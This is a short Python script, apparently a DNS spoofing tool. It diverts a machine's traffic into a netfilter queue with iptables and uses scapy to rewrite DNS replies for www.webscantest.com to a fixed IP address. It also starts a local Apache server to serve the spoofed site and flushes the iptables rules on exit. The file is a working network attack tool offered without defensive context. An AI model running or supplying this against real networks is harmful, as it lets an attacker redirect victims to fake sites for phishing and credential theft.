import subprocess
import netfilterqueue  # Needs to be installed
import scapy.all as scapy


def processed_packet(packet):
    dns="www.webscantest.com"
    
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNS):
        
        qname = scapy_packet[scapy.DNSQR].qname

        if dns in qname:
            answer = scapy.DNSRR(rrname=qname, rdata="216.92.49.183")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

        
        
            packet.set_payload(bytes(scapy_packet))

    packet.accept()  # packet.drop can be used for not sending packets.


try:
    subprocess.call(
        "sudo iptables --insert INPUT --jump NFQUEUE --queue-num 0", shell=True)
    subprocess.call(
        "sudo iptables --insert OUTPUT --jump NFQUEUE --queue-num 0", shell=True)
    subprocess.call(
        "sudo service apache2 start", shell=True)
    # Importing an object from netfilterqueue and assigning it to queue.
    queue = netfilterqueue.NetfilterQueue()
    # In which queue to store packets and next function to carry out operations to modify packet and send it target machine.
    queue.bind(0, processed_packet)
    queue.run()  # To make the desired queue whose number is 0 run.
except(KeyboardInterrupt):
    print("\nDetected Ctrl + C.Clearing queue please wait.")
    subprocess.call("sudo iptables --flush", shell=True)
    subprocess.call(
        "sudo service apache2 stop", shell=True)
